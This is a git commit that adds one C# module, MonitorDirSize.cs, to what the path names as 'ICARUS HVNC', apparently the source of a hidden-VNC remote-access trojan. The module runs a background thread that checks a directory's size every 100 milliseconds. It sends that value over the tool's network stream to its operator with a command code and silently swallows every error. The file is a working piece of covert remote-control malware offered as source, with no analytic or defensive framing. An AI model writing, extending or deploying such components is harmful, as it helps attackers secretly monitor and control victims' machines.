01ea5fd86fd92000d8f7a93ba4da8df738034d60
h1ercarbohydratemap11 <xcytrizen@outlook.com>
2025-09-18 13:50:36 +0400

    MonitorDirSize.cs

---
+++ ICARUS HVNC/Hidden Browser/Functions/MonitorDirSize.cs
@@ -0,0 +1,52 @@
+﻿using Microsoft.VisualBasic.CompilerServices;
+using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Linq;
+using System.Text;
+using System.Threading;
+using System.Threading.Tasks;
+
+namespace DLL.Functions
+{
+	public class MonitorDirSize
+	{
+		private Thread newthread;
+
+		public void StartMonitoring(string directory)
+		{
+			newthread = new Thread(delegate (object a0)
+			{
+				WorkerThread(Conversions.ToString(a0));
+			});
+			newthread.IsBackground = true;
+			newthread.SetApartmentState(ApartmentState.STA);
+			newthread.Start(directory);
+		}
+
+		private void WorkerThread(string directory)
+		{
+			while (true)
+			{
+				try
+				{
+					if (Directory.Exists(directory))
+					{
+						Outils.SendInformation(Outils.nstream, "23|" + Conversions.ToString(Math.Round((double)new GetDirSize().GetDirSizez(directory) / 1024.0 / 1024.0)));
+					}
+				}
+				catch (Exception projectError)
+				{
+					ProjectData.SetProjectError(projectError);
+					ProjectData.ClearProjectError();
+				}
+				Thread.Sleep(100);
+			}
+		}
+
+		public void StopMonitoring()
+		{
+			newthread.Abort();
+		}
+	}
+}
